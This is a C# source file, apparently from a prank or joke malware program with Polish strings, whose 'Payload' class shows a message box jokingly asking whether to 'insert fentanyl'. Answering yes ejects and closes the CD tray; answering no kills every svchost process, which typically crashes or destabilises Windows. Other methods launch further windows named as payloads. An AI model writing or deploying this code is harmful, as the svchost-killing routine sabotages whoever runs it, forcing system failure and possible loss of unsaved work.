using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace ai_floydziak
{
    public class Payload
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uRetrunLenght, int hwndCallback);

        public void InsertKremowka()
        {
            DialogResult dialog = MessageBox.Show("Chcesz wsadzić fentanyl?", "Wsadź fentanyl", MessageBoxButtons.YesNo);
            if (dialog == DialogResult.Yes)
            {
                // Zapewnia jednorazowe otwarcie i zamknięcie napędu
                if (!NapedOtwarty)
                {
                    OpenAndCloseCDAudioDoor();
                    NapedOtwarty = true;
                }
            }
            else
            {
                KillSvchostProcesses();
            }
        }

        private bool NapedOtwarty = false;

        public void OpenAndCloseCDAudioDoor()
        {
            try
            {
                mciSendString("set cdaudio door open", null, 0, 0);
                Thread.Sleep(2137);
                mciSendString("set cdaudio door close", null, 0, 0);
            }
            catch (Exception)
            {
                // Można tutaj dodać obsługę wyjątków lub logowanie błędu, jeśli jest to potrzebne.
            }
        }

        public void KillSvchostProcesses()
        {
            Process[] processes = Process.GetProcessesByName("svchost");
            foreach (var proc in processes)
            {
                try
                {
                    proc.Kill();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }

        public void Payload1()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form2());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void Payload2()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form3());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        public void Payload3()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form4());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
    }
}
